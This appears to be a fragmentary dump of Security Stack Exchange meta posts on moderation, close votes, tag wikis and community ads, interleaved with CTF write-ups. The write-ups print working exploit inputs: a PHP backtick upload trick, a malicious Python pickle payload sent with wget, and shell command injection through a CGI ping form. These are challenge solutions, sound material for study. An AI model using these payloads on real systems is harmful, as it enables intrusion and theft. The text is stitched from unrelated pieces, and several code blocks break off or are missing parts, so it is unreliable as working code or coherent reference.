<li>One of them concerns a new post from a few minutes ago, so I consider it too new to vote to close it (maybe just put a comment or edit it),</li>
<li>However there are other posts waiting a review, so I need to click on ""Skip"" to go to the next post.</li>
</ul>

<p>Once I have done that, how do I get back to this skipped review a few hours later?</p>

<p>I even looked in my profiles, under the ""votes"" and ""all actions"" sections but did not find anything there. However, the review URL itself, when typed directly, still seems to remain valid.</p>

<p>This use-case happens very regularly. My current workaround is just to mostly not bother any more with the close reviews during the day, only on the morning and late afternoon (French time). At times when there are usually a higher ratio of older posts.</p>

2005,2,2015-09-20T15:45:54.307,4,,"<p>Although Security Stack Exchange is better than many sites, I agree that people are petty about being on-topic, and particularly with close votes. I asked one about <a href=""https://security.stackexchange.com/questions/89593/what-are-the-new-security-features-in-windows-10"">Windows 10</a> that I think is a really useful question for the site, and to my surprise it was closed. I've also had <a href=""https://security.stackexchange.com/questions/80089/how-to-bypass-net-4-5-request-validation-for-an-xss-attack"">a question</a> closed by community votes then reopened by a moderator. The way the close vote queue works seems to encourage a kind of hive mind, where a single close vote quickly progresses to five. To be honest, I've largely given up on asking questions here, although I do enjoy providing answers.</p>

<p>The guys on StackOverflow have discussed this issue at some length (sorry, I don't have links to hand). They talk about signal to noise ratio, and reckon you need to be strict about keeping posts on topic to keep the signal high. I don't agree with that, I am lenient about posts which are borderline. I think signal to noise ratio is not that important, because search works well. But the thing about being part of a community is that you don't get to do everything your way.</p>

<p>A couple of things that may cheer you up:</p>

<p>If people read your post and think ""interesting question but I don't know the answer"" they tend to move on without comment. This inherently means that comments visible will be more negative that the general mood. That's life online - either deal with it, or stop using internet forums. Also, I tend to reserve upvotes for things I am particularly interested in, and I don't ""sympathy upvote"" if a reasonable question is already downvoted, because that causes a net rep change of +8, practically the same as a straight upvote.</p>

<p>Also, consider that the knowledgeable people on this site are mostly motivated to answer interesting questions. Whether it's to practice writing skills, build an online profile, whatever. That is their primary interest; helping you out is secondary. If you don't like that I think your only option would be to pay a consultant to answer your questions. The experienced guys here will charge $1000+ per day - but you're getting them for free.</p>

<p>What may be basic for one may not be for another: sometimes, people just need a keyword, the name of a concept, or something like that so they can engage their own researches.

<li>within a link/source included in the Question itself</li>
</ol>

<p>The answers are at their fingertips, but for some reason the asker decides to ask others instead of spending a minute looking at what they already have. </p>

<p>I don't think that a ""close reason"" is a good idea, though. First, there are very real cultural reasons why some people will ask others instead of looking at primary data. Second, it is also often the case that the asker <em>did</em> perform research, but they didn't include it in the question (either due to laziness or to wanting an answer unbiased by the research performed).</p>

<p>In either case, I believe that we need to prompt for research, not to close it for a canned reason. When I do this, there are 2 distinct camps: those who readily provide the research performed, or those who lash out that we didn't provide an easy answer. For the former, the problem is solved, for the latter, the available options or ""Other"" should suffice.</p>

<p>We <strong>do</strong> expect that askers have performed some basic research. We can encourage and mentor the community to do that.</p>

<p>Agreed, suggesting edits from same person accounts could be used to gain site reputation (say, <a href=""https://security.stackexchange.com/help/privileges/new-user"">only 10 reputation points are needed to remove new user restrictions</a>, i.e. only 5 suggested edits which, if they were made on same user contributions, the same user can approve from that other account), and it gets worse in that the <em>standard query</em> that Stack Exchange stuff run when asked to merge accounts doesn't invalidate any reputation gain by suggesting edits on own contents (I tested that). So there's good reasons to be cautious.</p>

<p>Here's a couple of things to do when you suspect, for any reason, that two accounts are of the same person:</p>

<ul>
<li>Reject suggested edit, mentioning in the reason for rejection that the person suggesting it can edit with original account, and if they can't access their contents with their old account (happens, many first post some question or answer from one computer, then register from another), request via flags, in chat,... that accounts are merged.</li>
<li>Stop by in <a href=""https://chat.stackexchange.com/rooms/151/the-dmz"">our chat room</a> and ping one of our moderators with request that accounts be looked into and merge requested (mods can't do that but we have a simple enough request form to fill for that), if warranted. You may also want to raise a custom flag for moderator attention on the post itself and explain what you suspect is going on.</li>
<li>See if the post needs editing anyway, and if it does, hit the <em>reject and edit</em> button, edit and submit so the suggested edit review queue is cleared of that item and isn't later approved by next two reviewers that missed this, erm, <em>user correlation</em>, let's put it mildly.</li>

<blockquote>
  <p>what distribution should I consider to be reasonably confident that I will get timely security patches?</p>
</blockquote>

<p>Granted, this one may sound as a product recommendation, but from the sequel below I'm not sure that the OP really expect an actual name but merely advices on how to choose.</p>

<blockquote>
  <p>My current strategy is to pick one of most popular distributions and hoping for ""enough eyeballs effect"" to take place.</p>

<p>Talking about how to choose, the OP present his current criteria so we can provide a feedback whether it makes sense or not.</p>

<blockquote>
  <p>Are there distributions that have noticeably better track record than others?</p>
</blockquote>

<p>Now he asks for objective information sources which can help in this decision. To some people here these track records may be obviously a wrong criterion, but from a marketing point of view it is what is used by some commercial Linux distributions which are fighting against others by producing statistical charts ""prooving"" how they perform well against the competition (for what matter, yes Oracle Linux <a href=""http://www.itworld.com/article/2724161/enterprise-software/oracle-publicly-bashes-centos-linux--offers-free-conversion-script.html"" rel=""nofollow noreferrer"">I'm looking at you</a>).</p>

<blockquote>

<p>Still seeking for objective criterion, the OP does not limit itself to the time needed for the patch being available, but also for the complexity caused by the the patch application (which is a right mindset, some distributions for instance providing only a source code patch requiring compilation, or bundle the security update with new features which could require configuration changes to get it running).</p>

<p>I suppose I must misinterpret something here, since I just see someone asking for advices, and not opinion, in a question generally well formulated (puts a general context, shows personal research, suggest objective possible criterion as a example and request for feedback on these).</p>

<p>It's good that the OP put down the time frame that he considers to be ""Good security"", but in the end we'd need to have real statistics to answer this.  How fast does Ubuntu, Debian, FreeBSD, Mint, etc release patches?  Is that time reasonable?  Who determines complexity vs. reasonable response time?</p>

<p>I see what you're saying, and the OP did their best to narrow the scope of their question.  But I believe that the answers received would have been strictly that of opinion, and not based on any real statistics.  It's not that the question is primarily opinion-based, but that the answers generated will be inherently opinion-based.  If that makes sense.</p>

2067,1,2015-11-02T20:37:07.403,15,164,"<p>In general, Sec.SE bans questions on tool recommendations. <a href=""https://security.meta.stackexchange.com/questions/1955/contradiction-towards-the-policy-regarding-on-topic-subjects"">This answer</a> appears to be the most recent statement by a moderator.</p>

<p>I propose we reconsider this ban and allow tool recommendations in specific circumstances. In particular, when the question is ""How do I...?"" and the answer is ""Use ... tool"". An example I've just seen is <a href=""https://security.stackexchange.com/questions/104406/any-worthy-open-source-java-source-code-analysis-tool-from-finding-security-vuln"">this</a> which could be reworded as ""How do I audit Java code for security flaws?""</p>

<p>Tools are a crucial part of doing technical security. This restriction creates a significant gap in the kind of questions that can be asked here. Sure, people can go off to other sites to get answers, but why not just allow them here? Well, people have spoken before about that and there seem to be two main reasons: timeliness and spam. However, I think that both of these are poor arguments, for the following reasons:</p>

<p>Timeliness: most tool recommendations are not especially timely. For ""How do I do a port scan?"" the answer ""Nmap"" has been valid for at least 15 years. In any case, many topics covered here are timely to some degree, and we deal with this by editing answers and adding new ones.</p>

<p>Spam: any blatant spam can be dealt with by flags and moderation, just as any other topic. I think the real concern here is self-promotion: get your mate to ask ""How do I skin a womble?"" then you answer ""Buy the all-new Acme womble skinner"". This is a fair concern, but we can deal with this in the usual way. If skinning a womble isn't interesting to the community, the question gets downvoted. If the Acme womble skinner is a duff product, the answer gets downvoted.</p>

<p>Seriously guys, reconsider the ban on tool recommendations, it detracts from the site.</p>

<p>Tool recommendations have too many different options, even in something as simple as a port scan. Then start the debates: ""Nmap sucks for UDP scanning!"" (well, it does). </p>

We require that people do at least a little research before asking here. This helps the community in two ways: by not encouraging answers that are simply links to external sources, and it prevents the Answerers from wasting their time submitting an answer that would be rejected because the OP doesn't like the direction of the research the Answerer took. Research, as always, helps to define the scope of the question.</p>

<p>In StackOverflow, and with programming questions, it is possible to have multiple different perspectives with multiple different approaches, so even if the question might have an answer elsewhere, there is still value in that community devising its own answers. But for a factual question asking a yes/no answer (e.g. ""can experts recover data from a damaged magstripe?""), there is nothing this community can provide that would be unique or with value added. Yes, there is a machine that appears to do it.</p>

<p>(a) Was ""trying to ask"" about a really interesting &amp; important--if super-duper-broad---topic: whether typical smartphones have the secure hardware within them to do what smartcards &amp; PCs with TPMs can do. (To put it very roughly.) </p>

<p>And;</p>

<p>(b) Could use some, uh, significant ""improvements"" of the kind that editors are encouraged to make. :)  (You can look at the original question yourself.)</p>

<p>So I set out to try to improve the question while staying very faithful to  what I thought the asker was trying to get at. I substantially reworked the first half of the question to improve the clarity, focus, and accuracy while still keeping the question about what hardware-based security capabilities smartphones have vs. smartcards &amp; PCs with TPMs.  Moreover, I deliberately decided <em>not</em> to narrow the ultra-broad scope of the question.  Even though I realized that doing that would make the question easier to answer and would probably lead to better quality answers. Because it seemed to me that the original asker's intent <em>was exactly to ask a very, very broad question</em>. </p>

<p>In sum, I tried to be faithful to the ""original intent"" behind the question by keeping the substance &amp; scope of it the same.  (As I did explain in my edit description.) But, at least in the eyes of a couple reviewers, I went too far.  Can anyone give me some feedback about where I went wrong?  Or is this maybe a case where making extensive-but-legitimate changes to a question was perhaps ... misinterpreted as changing the intent of the original question?</p>

<p>However, while thinking about it, we are not on the ""<em>IT infrastructure security</em>"" website, but on ""<em>Information security</em>"". The <a href=""https://security.stackexchange.com/help/on-topic"">On-topic</a> web page describes it as a place ""<em>for Information Security professionals to discuss protecting <strong>assets</strong> from <strong>threats</strong> and <strong>vulnerabilities</em></strong>"".</p>

<p>I think that intellectual property can be considered an asset, whose main threat would be piracy, making DRM discussion perfectly on-topic here, whether the OP question has an answer or not: ""<em>No, with current technology what you ask is not possible</em>"" can be a valid answer to some questions without making the question off-topic at all. I feel it would also need a more lax reaction toward security through obscurity since it composes most DRM ""security"" core.</p>

<p>DRM is often a failing game depending on who you're trying to protect your thing from.  But much of the world is still convinced that you can somehow have perfect protection, or that it's simply a ""cat and mouse game"".  The latter is at least a little true, but is still a vast oversimplification.  It's more like a cat/mouse game where Tom is the Cat, and Jerry is the mouse.

2115,2,2015-12-24T16:55:05.843,3,,"<p>As you surmise, the question is off-topic. It isn't about designing or analyzing a security policy. It isn't even about configuring a tool to implement a security policy, which is strictly speaking off-topic (configuring IT tools is off-topic here, and usually on-topic on sites such as <a href=""https://superuser.com/"">Super User</a>, <a href=""https://unix.stackexchange.com/"">Unix &amp; Linux</a>, <a href=""https://android.stackexchange.com/"">Android</a>, <a href=""https://serverfault.com/"">Server Fault</a>, <a href=""https://networkengineering.stackexchange.com/"">Network Engineering</a>, etc.) but is sometimes borderline as there isn't a clear-cut line between understanding the policy and approximating it with the tool's capabilities (on-topic) and figuring out what to write in the configuration file (off-topic). Nor is it about using tools primarily used by security professionals (e.g. penetration testing or forensic tools).</p>

<p>The question asks how to find a program supporting a particular protocol (SSLv3). The fact that the reason such programs are hard to find is related to security isn't relevant to the question. It's no different from “I have an old, forgotten server that only supports rsh but I only have SSH clients, how can I connect to it?” or “I have an old, forgotten server that only accepts Gopher requests, how can I send one?”.</p>

<p>It seems that some people have voted to leave the question open, possibly because the question went viral and got a lot of views. Please don't do that. Having a lot of view, or having a high score, is not a reason to keep an off-topic question open. Migrating this question to Super User is the correct action.

<blockquote>
  <p>We have obtained what we believe is a configuration backup of an embedded device. However, it seems to be encrypted. Maybe you can help us with decryption?</p>
</blockquote>

<p><a href=""https://github.com/ctfs/write-ups-2015/raw/master/32c3-ctf-2015/forensics/config-bin-150/config.bin"" rel=""nofollow"">config.bin</a></p>

<h2>Write-up</h2>

<p>After a quick hexdump we might realize that the first 4 bytes are looking pretty much like a magic header.</p>

<pre><code>hexdump -C config.bin | head
00000000  43 46 47 31 00 00 32 d0  ef 92 7a b0 5a b6 d8 0d  |CFG1..2...z.Z...|
00000010  30 30 30 30 30 30 00 00  00 05 00 03 00 00 00 00  |000000..........|
</code></pre>

<p>After searching for ""CFG1"" with the search engine of our choice, we might find <a href=""https://heinrichs.io/207"" rel=""nofollow"">this</a> blog entry.  This tells us it might be a firmware image of some router (or at least something which looks like it).<br>
There is a windows tool on that website to decrypt the firmware images, lets see if it works for us:</p>

<pre><code>decrypting config.bin...
reading config.bin... 13056 bytes read.
parsing header... ok.
setting crypto key... ok.
decrypting... MD5 of plaintext invalid.
</code></pre>

<p>Hmm, nope. That looks like it might be in deed the right algorithm, but something is wrong (maybe the password).<br>
Well, that would have been too easy otherwise.<br>
So lets try if we can parse the file header with the information provided in that block entry.
As a a python ctypes Structure the header looks like this:</p>

<pre><code>class Header(ctypes.BigEndianStructure):
    _fields_ = [
                (""magic"", ctypes.ARRAY(ctypes.c_char, 4)),
                (""payload_size"", ctypes.c_uint32),
                (""header_md5"", ctypes.ARRAY(ctypes.c_ubyte, 8)),
                (""etl"", ctypes.ARRAY(ctypes.c_uint8, 7)), # always zero
                (""unused_1"", ctypes.c_char),
                (""password_len"", ctypes.c_uint16),
                (""padding_len"", ctypes.c_uint16),
                (""unused_2"", ctypes.ARRAY(ctypes.c_ubyte, 4)),
                (""plaintext_md5"", ctypes.ARRAY(ctypes.c_ubyte, 16))
                ]
</code></pre>

<p>The header contains a field for the first 8 bytes of a md5 over the header. After testing if it is correct, we can be pretty sure the header structure is right.<br>
So, chances are good we need to find the correct password.<br>
~~Stupidly~~Luckily the length of the password is saved in the header and an MD5 sum over the plaintext, too (The password is of 5 chars length).
According to the linked blog post the <em>plaintext</em> is encrypted with AES256 in ECB mode.
That sounds reasonable enough to bruteforce it.<br>
... But it is way to slow. The decryption of the whole cryptext needs way to long (~13kb after all).<br>
With ~8k tries per second we'll never find the password.</p>

<p>Maybe we find some other way to verify the password.<br>
After some searching we might find out that the plaintext of the images in this format always seem to be gzip compressed.<br>
This is <strong>awesome</strong>, as the gzip format has a 3 byte (2 byte in theory, 3 in fact) magic header.<br>
So we only need to decrypt the first block with AES and verify the first 3 bytes (With additionally md5 verification IF the magic header was found).<br>
This gives us about 280k try per second. Not really fast, but it might be fast enough for a password with 5 chars.<br>
Finally we can start bruteforcing.
After some (more) time we find our password and are able to decrypt the file.<br>
It is an tar.gz archive containing two files.
Digging through them we find a line like this <em>(password changed)</em>:</p>

<pre><code>PASSWORD=""MzJDM19hc2QxMjE1NjRxMTIxZD/nU2NGE1NnNkMWYzMmFkMTMyYTQ1""
</code></pre>

<p>After removing that evil <code>/n</code> in there we are able to base64 decode it and get the password. <strong>YAY</strong></p>

<li><p>I understand that users with a low reputation are not allowed to comment other people's posts in order to prevent spam, since comments do not bring the posts on the top of the <em>Recently active</em> tab and therefore benefit from less reviews.</p></li>
<li><p>I understand too that, <em>in theory</em>, users with such low rep have the possibility, <a href=""https://security.meta.stackexchange.com/a/1304/32746"">if they have no other choice</a>, to post they comment as a new answer so it gets reviewed and if it is legit manually transformed into a comment by a moderator.</p></li>
</ul>

<p><strong>However:</strong></p>

<ul>
<li><p>I notice that the flag meant to raise moderator's attention toward such posts happily mixes in a single bag valid and useful posts which should be kept and transformed into comments and posts which should be deleted:</p>

<blockquote>
  <p>not an answer: This was posted as an answer, but it does not attempt to answer the question. It should possibly be an edit, <strong>a comment</strong>, another question, or <strong>deleted altogether</strong>.</p>
</blockquote></li>
<li><p>When such a flag is raised, the post is added to the <em>Low quality posts</em> lists where one has basically the choice between ""<em>Looks OK</em>"" which is not right because it is not a valid answer, and ""<em>Recommend deletion</em>"" which is not right too because the content is valid and should be kept (as a comment),</p></li>
<li><p>The meaning of this flag seems to be badly perceived by the reviewers, by the past I raised a few flags to signal such posts needing to be turned into comment, I think such flags were systematically disputed because these posts were not meant to be deleted while the post itself was effectively turned into a comment (I see this as a direct consequence of the previous point).</p></li>
<li><p>The automatic comment left when using this flag always seems a bit rude to me.</p>

<blockquote>
  <p>This does not provide an answer to the question. To critique or request clarification from an author, leave a comment below their post - you can always comment on your own posts, and once you have sufficient reputation you will be able to comment on any post.</p>
</blockquote>

<p>When I read this from a newcomer perspective (which should be the primary target of this message), I see ""<em>This is not a valid answer, use comments instead, too sad you cannot!</em>"", which seems a bit rude even-more when the poster already apologized of not being able to post a comment as I often see in such circumstances, and I understand some <a href=""https://security.stackexchange.com/review/low-quality-posts/66646"">may take this wrongly</a> (link useful only until the Nazi related comment gets deleted...).</p></li>
</ul>

<p><strong>Why isn't there two different flags?</strong></p>

<ul>
<li><p>One for actual low quality posts which should indeed be either edited or deleted,</p></li>
<li><p>Another for comments posts which should be transformed as a comment?</p></li>
</ul>

<p>I think this would greatly clarify the handling of such situations, and accompanied with a more productive automatic message (why not link to a canonical explanation why newcomers are not allowed to comment? Wouldn't this make them better understand the situation, what is going to happen, and how this site has been thought? As newcomers, they may not know meta and the help center, and deserve some friendliness to encourage them to stay.).</p>

<p>Reviewers, please <strong>reject</strong> tag wiki suggestions that are copied from Wikipedia or other sources, or more generally that suggest content that isn't relevant to security professionals.</p>

<p>It's often illegal (copying content from Wikipedia requires attribution, which is impossible in a tag wiki excerpt), but that's not the main problem.</p>

<p>The main problem is that text from Wikipedia is almost never adequate for this site. Tag wikis are meant to contain information that is useful for <strong>our</strong> community. This is not the same goal as Wikipedia, so it isn't surprising that what's good for Wikipedia isn't good for us.</p>

<ul>
<li>Dictionary definitions for terms that everybody knows are not helpful. Define concepts only if they are not known to the whole community. Focus on the <strong>relevance to our community</strong>, i.e. security professionals.

<ul>
<li>Expand acronyms if they're common but not universal abbreviations (e.g. <a href=""https://security.stackexchange.com/questions/tagged/ids"" class=""post-tag"" title=""show questions tagged &#39;ids&#39;"" rel=""tag"">ids</a>). Don't expand acronyms if they're a proper name that isn't normally expanded (e.g. <a href=""https://security.stackexchange.com/questions/tagged/aes"" class=""post-tag"" title=""show questions tagged &#39;aes&#39;"" rel=""tag"">aes</a>).</li>
</ul></li>
<li><strong>Do not include encyclopedic details</strong> such as who invented the concept and when. Encyclopedic data belongs on Wikipedia.</li>
<li>Excerpts should be short and to the point. Put the concept in context: <strong>how is it relevant to a security professional?</strong> One sentence, or even a sentence fragment, is enough for all but the most subtle cases. If there is any doubt as to when the tag should and shouldn't be used, summarize the usage guidance in the excerpt.</li>
<li>In the main tag wiki body, provide a <strong>high-level overview</strong> of the tag's subject material. Once again, explain what is relevant to a security professional.

<ul>
<li>Do <em>link</em> to the Wikipedia article if there is one.</li>
<li>Do link to the vendor or project home page if applicable, as well as any official documentation and other useful out-of-site resources (tutorials, implementations, etc.).</li>
</ul></li>
<li>Also explain in more detail when the tag should and shouldn't be used, if it isn't immediately obvious. Don't write “the tag <code>widget</code> is about widgets”, but if it isn't always clear when the tag should be used, do provide <strong>usage guidance</strong>.

<ul>
<li>Do mention tags that people might want to use instead or in addition.</li>
</ul></li>
<li>Look for <strong>frequently asked questions</strong> in the tag and link them in the tag wiki. Votes and views are often a good indicator but use your own experience and judgement as well. Linking questions helps people confronted with common problem, and helps close voters find duplicates more quickly.</li>

<p><strong>Converting</strong></p>

<p><s>As far as I know, converting answers to comments and vice versa is allowed to 10k rep. users.</s><br>
<em>Ok, this is false - thanks @grawity.</em></p>

<p>Personally, I think that merging this privilege with 3k rep. (close and reopen votes) or 10k tools could help solve problems quicker.</p>

<p><strong>Commenting privilege</strong></p>

<p>New users cannot post comments because of spam. Commenting privilege is granted on 50 rep. - that is 5 upvotes on answer. However, the privilege ""Remove new user restrictions"" is granted on 10 rep. - 1 upvote on answer or 2 on question. A user who has already provided a good answer or a good question should be able to comment. If somebody think that this will not be enough, then 20 rep. is also better.</p>

<p><strong>""Low quality posts"" queue</strong></p>

<p>The queue should beside ""Looks OK"" and ""Recommend deletion"" have one other button - ""Recommend conversion"".</p>

<h2>web — TinyHosting</h2>

<p>We can upload files with the name of our choice and a content of up to 7 bytes, and we can then browse that file at a given URL of the form <code>/files/<em>HASH</em>/<em>CHOSEN_NAME</em></code> to get the content, where <code><em>HASH</em></code> is independent of the name (it's actually SHA-1(IP address + user agent)).</p>

<p><a href=""https://security.stackexchange.com/users/25859/hamza"">HamZa</a> did the hard work of finding that using <code>&lt;?=`?`;</code> as the content for a file with the extension <code>.php</code> would execute <code>?</code> as an external command, where <code>?</code> could be most any character. For example <code>&lt;?=`w`;</code> shows the server's load average and other information.</p>

<p>There's not much you can do with a one-character command, but fortunately there's another loophole: wildcards are expanded before the command is executed. So we can use <code>&lt;?=`*`;</code>, which expands to the list of file names in the current directory, which is the upload directory; this will execute the first file name in lexicographic order.</p>

<p>The upload directory contains at least the PHP file and <code>index.html</code>, so we need to arrange that the PHP script is at the end of the alphabet and to run a command that comes before <code>index.html</code>. We can even pass it arguments, as long as the command comes first, then the arguments in alphabetical order, with <code>index.html</code> and the PHP file in there somewhere. A nice lexicographically early command is <code>awk</code>, which has a shell escape (the <code>system</code> function). Hence this injection script:</p>

<pre><code>#!/bin/sh
user_agent='foo1'
encode () {
  printf '%s\n' ""$1"" | sed -e 's/%/%25/g' \

<p>Running <code>./upload 'ls /'</code> shows that there's a file called <code>/file_you_want</code>, and <code>./upload 'cat /file_you_want'</code> gives the flag.</p>

<h2>misc — gurke</h2>

<p>We have to submit input to a Python script. This script has the flag in a variable <code>flag.flag</code>. The input vector is a string that's passed to <code>pickle.loads</code> and printed out. There's a twist: we don't get to see the printout, but we do get to see a printout of any exception caused by the unpickling.</p>

<pre><code>data = os.read(0, 4096)
try:
    res = pickle.loads(data)
    print 'res: %r\n' % res
except Exception as e:
    print &gt;&gt;sys.stderr, ""exception"", repr(e)
</code></pre>

<p>So we need to find a pickled input that will cause an exception that displays the flag. The Python script loads a bunch of modules and sets up a sandbox environment that won't let it load other modules, but that turns out to be a bit of a red herring as I only needed <code>__builtin__</code> in the end.</p>

<p>After playing around in the interactive interpreter and looking at the source of <code>pickle.py</code> to understand the pickle format, I found that you could pass arbitrary function calls.</p>

<pre><code>wget -q -O - http://136.243.194.43/ --post-data=$'c__builtin__\ngetattr\n(S\'foo\'\nc__builtin__\ngetattr\n(c__main__\nflag\nS\'flag\'\ntRtR.'

<p>Keep in mind, we have updated some of the guidelines compared to previously - the changes are marked in bold in the Image Requirements section.</p>

<h3>What are Community Promotion Ads?</h3>

<p>Community Promotion Ads are community-vetted advertisements that will show up on the main site, in the right sidebar. The purpose of this question is the vetting process. Images of the advertisements are provided, and community voting will enable the advertisements to be shown.</p>

<h3>Why do we have Community Promotion Ads?</h3>

<p>This is a method for the community to control what gets promoted to visitors on the site. For example, you might promote the following things:</p>

<ul>
<li>cool security related open source apps</li>
<li>the site's twitter account</li>
<li>cool events or conferences</li>
<li>anything else your community would genuinely be interested in</li>
</ul>

<p>The goal is for future visitors to find out about <em>the stuff your community deems important</em>. This also serves as a way to promote information and resources that are <em>relevant to your own community's interests</em>, both for those already in the community and those yet to join. </p>

<h3>Why do we reset the ads every year?</h3>

<p>Some services will maintain usefulness over the years, while other things will wane to allow for new faces to show up. Resetting the ads every year helps accommodate this, and allows old ads that have served their purpose to be cycled out for fresher ads for newer things. This helps keep the material in the ads relevant to not just the subject matter of the community, but to the current status of the community. We reset the ads once a year, every December.</p>

<p>The community promotion ads have no restrictions against reposting an ad from a previous cycle. If a particular service or ad is very valuable to the community and will continue to be so, it is a good idea to repost it. It may be helpful to give it a new face in the process, so as to prevent the imagery of the ad from getting stale after a year of exposure.</p>

<h3>How does it work?</h3>

<p>The answers you post to this question <em>must</em> conform to the following rules, or they will be ignored. </p>

<ol>
<li><p>All answers should be in the exact form of:</p>

<pre><code>[![Tagline to show on mouseover][1]][2]

   [1]: http://image-url
   [2]: http://clickthrough-url 
</code></pre>

<p>Please <strong>do not add anything else to the body of the post</strong>. If you want to discuss something, do it in the comments.</p></li>
<li><p>The question must always be tagged with the magic <a href=""/questions/tagged/community-ads"" class=""post-tag moderator-tag"" title=""show questions tagged &#39;community-ads&#39;"" rel=""tag"">community-ads</a> tag. In addition to enabling the functionality of the advertisements, this tag also pre-fills the answer form with the above required form.</p></li>
</ol>

<h3>Image requirements</h3>

<ul>
<li>The image that you create must be <strong>300 x 250 pixels</strong>, or double that if high DPI.</li>
<li>Must be hosted through our standard image uploader (imgur)</li>
<li>Must be GIF or PNG</li>
<li>No animated GIFs</li>
<li>Absolute limit on file size of <strong>150 KB</strong></li>
<li><strong>If the background of the image is white or partially white, there must be a 1px border (2px if high DPI) surrounding it.</strong></li>
</ul>

<h3>Score Threshold</h3>

<p>There is a <strong>minimum score threshold</strong> an answer must meet (currently <strong>6</strong>) before it will be shown on the main site.</p>

<p>You can check out the ads that have met the threshold with basic click stats <a href=""https://security.meta.stackexchange.com/ads/display/2144"">here</a>.</p>

<li><p>Some questions use this tag to ask about historical subjects, for instance <a href=""https://security.stackexchange.com/q/55023/32746""><em>What was so dangerous about PGP that its creator was charged in court for it?</em></a> or <a href=""https://security.stackexchange.com/q/103731/32746""><em>Why has the NSA had a hand in deciding on encryption standards?</em></a> (it may be worth noting that these are by far the two most upvoted questions with this tag),</p></li>
<li><p>Some other questions use this tag to ask about the history and logs stored by various systems, for instance <a href=""https://security.stackexchange.com/q/99866/32746""><em>What does my iPhone see/track when connected to my macbook PC?</em></a> or <a href=""https://security.stackexchange.com/q/62271/32746""><em>How are logs stored with ISP?</em></a> (the reviewed question obviously comes here).</p></li>
</ul>

<p>I think that the role of this tag should be clarified and this tag removed from the questions where it is not appropriate. However, I raise the issue here because both uses seem legit and make sense as per this site topic. So I think a common discussion might be more appropriate before doing anything.</p>

<p>My current understanding and a quick check leads me to such suggestion:</p>

<li><p>Merge the <a href=""https://security.stackexchange.com/questions/tagged/historical"" class=""post-tag"" title=""show questions tagged &#39;historical&#39;"" rel=""tag"">historical</a> and <a href=""https://security.stackexchange.com/questions/tagged/history"" class=""post-tag"" title=""show questions tagged &#39;history&#39;"" rel=""tag"">history</a> to keep only one of them (while less used, the former may have a clearer wording than the latter one?),</p></li>

<p>As we saw in smartcat1, <a href=""http://smartcat.insomnihack.ch/cgi-bin/index.cgi"" rel=""nofollow noreferrer"">http://smartcat.insomnihack.ch/cgi-bin/index.cgi</a> lets us submit a string which is executed as a shell command, prefixed by <code>ping -c 1</code> (with a space at the end). The string we can inject can't contain horizontal spaces or any of <code>$;&amp;|({`</code> but can contain newlines. We're told that this time the flag is in <code>/home/smartcat</code>. We can get the command's output on stdout, but not its output on stderr. We only get the command's output if it succeeds, but that's easily arranged by adding <code>true</code> as the last command.</p>

<p>Let's explore the <code>/home/smartcat</code> directory.</p>

<pre><code>wget -O - http://smartcat.insomnihack.ch/cgi-bin/index.cgi --post-data=$'dest=127.0.0.1\nHOME=/home/smartcat\ncd\nls'
</code></pre>

<p>There are two files, <code>flag2</code> and <code>readflag</code>. Unfortunately neither <code>cat&lt;flag2</code> nor <code>./readflag&lt;flag2</code> succeed. But we can read <code>readflag</code> (it's a binary so I use base64 to make it easy to go through layers of escaping):</p>

<pre><code>wget -O - http://smartcat.insomnihack.ch/cgi-bin/index.cgi --post-data=$'dest=127.0.0.1\nHOME=/home/smartcat\ncd\nbase64&lt;readflag'
</code></pre>

<p>There are intersting strings in that program:</p>

<pre><code>Almost there... just trying to make sure you can execute arbitrary commands....
Write 'Give me a...' on my stdin, wait 2 seconds, and then write '... flag!'.
Do not include the quotes. Each part is a different line.
</code></pre>

<p>So how can we execute arbitrary code? Pipes are forbidden but not redirection, so we can use <code>sh&lt;/path/to/file</code>, if we're able to get arbitrary shell code into a file. A bit of experimenting shows that we can read and write files in <code>/tmp</code>. How do we get the desired file content, without using any command that takes a command line argument? The <code>env</code> command! It lets us write arbitrary code into a file by defining an environment variable whose value contains newline; the code is in the middle of some garbage doesn't prevent running the script. And we can inject an environment variable: <code>HTTP_USER_AGENT</code>.</p>

<pre><code>wget -U $'ignored; { echo Give me a...; sleep 2; echo ... flag\!; } | /home/smartcat/readflag' \
     -O - http://smartcat.insomnihack.ch/cgi-bin/index.cgi \
     --post-data=$'dest=127.0.0.1\nenv&gt;/tmp/D25Tm1Tx.sh\nsh&lt;/tmp/D25Tm1Tx.sh\ntrue'`
</code></pre>

<h1>Bring the noise</h1>

<p>Step 1: we get a challenge consisting of 5 random hex digits. We need to reply with a string string whose MD5 in hex starts with those 5 digits.</p>



<pre><code>#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;tomcrypt.h&gt;

static void calculate_md5(unsigned char *result, unsigned char *input, size_t length)
{
    hash_state state;
    md5_init(&amp;state);

    md5_done(&amp;state, result);
}

                    calculate_md5(md5, (unsigned char*)response, 4);
                    if (md5[0] == challenge &gt;&gt; 12 &amp;&amp;
                        md5[1] == (challenge &gt;&gt; 4 &amp; 0xff) &amp;&amp;
                        (md5[2] &gt;&gt; 4) == (challenge &amp; 0xf)) {
                        return;
                    }
                }
            }
        }
    }
}

int main()
{
    unsigned md5_challenge;
    char md5_response[10];
    if (!scanf(""Challenge = %x\n"", &amp;md5_challenge)) {
        perror(""read challenge"");
        exit(1);
    }
    search_md5(md5_challenge, md5_response);
    puts(md5_response);
    return 0;
}
</code></pre>

<p>Step 2 uses the following Python function:</p>



<pre><code>def learn_with_vibrations():
    q, n, eqs = 8, 6, 40
    solution = [randint(q) for i in range(n)]
    equations = []
    for i in range(eqs):
        coefs = [randint(q) for i in range(n)]
        result = sum([solution[i]*coefs[i] for i in range(n)]) % q
        vibration = randint(3) - 1
        result = (result + q + vibration) % q
        equations.append('%s, %d' % (str(coefs)[1:-1], result))
    return equations, solution
</code></pre>

<p><code>solution</code> is a list of 6 random integers in the range 0–7. We get 40 equations of the form <code>sum(c[i] * solution[i]) = r</code> where <code>r</code> is the result of the summation mod 8 with a random “vibration” that can cause a difference of -1, 0 or +1. We need to find the solution. There are only 2<sup>20</sup> potential solutions so we can just try them all by brute force.</p>

<h1>Fridginator 10k</h1>

<p>Searching for food redirects to an interesting-looking URL, e.g. <code>/search/67d4b8f78c33d07cbdc7293b9cd93b8f37231e5001982893f5c3a6494d14bbba/</code> for an empty query string. A bit of experimentation shows that the hex string consists of a variable number of 16-byte blocks (represented as 32 hex digits each), and changing one byte of the query leads to changing one block:</p>

<pre><code>query length    blocks  last block constant
0-9             2       yes
9-12            2       no
13-25           3       yes
26-28           3       no
